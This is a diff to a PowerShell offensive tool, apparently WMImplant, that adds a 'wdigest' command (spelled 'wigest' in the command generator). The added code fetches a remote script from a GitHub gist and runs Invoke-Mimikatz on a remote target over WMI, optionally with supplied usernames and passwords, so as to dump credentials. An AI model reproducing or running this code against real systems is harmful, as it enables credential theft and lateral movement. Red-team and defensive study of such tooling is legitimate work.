@@ -830,6 +830,21 @@ function Invoke-CommandGeneration
             }
         }
 
+        "wigest"
+        {
+            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
+            {
+                $Command = "`nInvoke-WMImplant -command remote_posh -Url https://gist.githubusercontent.com/ChrisTruncer/5cf37e859372f135219daa4b699eb587/raw/f6517e07463427c8f9e418e8ca5dd4afbcaf9654/gistfile1.txt -Function Invoke-Mimikatz -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
+                $Command
+            }
+
+            else
+            {
+                $Command = "`nInvoke-WMImplant -command remote_posh -Url https://gist.githubusercontent.com/ChrisTruncer/5cf37e859372f135219daa4b699eb587/raw/f6517e07463427c8f9e418e8ca5dd4afbcaf9654/gistfile1.txt -Function Invoke-Mimikatz -Target $GenTarget`n"
+                $Command
+            }
+        }
+
         "process_kill"
         {
             $GenKillMethod = Read-Host "Do you want to kill a process by its [name] or [pid]? >"
@@ -2381,6 +2396,24 @@ function Invoke-WMImplant
                             }
 
                         }
+                    }
+                }
+
+                "wdigest"
+                {
+                    if(!$Target)
+                    {
+                        Throw "You need to provide a target to run the command against!"
+                    }
+
+                    if($RemoteCredential)
+                    {
+                        Invoke-RemoteScriptWithOutput -Creds $RemoteCredential -Url https://gist.githubusercontent.com/ChrisTruncer/5cf37e859372f135219daa4b699eb587/raw/f6517e07463427c8f9e418e8ca5dd4afbcaf9654/gistfile1.txt -Function Invoke-Mimikatz -Target $Target
+                    }
+
+                    else
+                    {
+                        Invoke-RemoteScriptWithOutput -Url https://gist.githubusercontent.com/ChrisTruncer/5cf37e859372f135219daa4b699eb587/raw/f6517e07463427c8f9e418e8ca5dd4afbcaf9654/gistfile1.txt -Function Invoke-Mimikatz -Target $Target
                     }
                 }
 
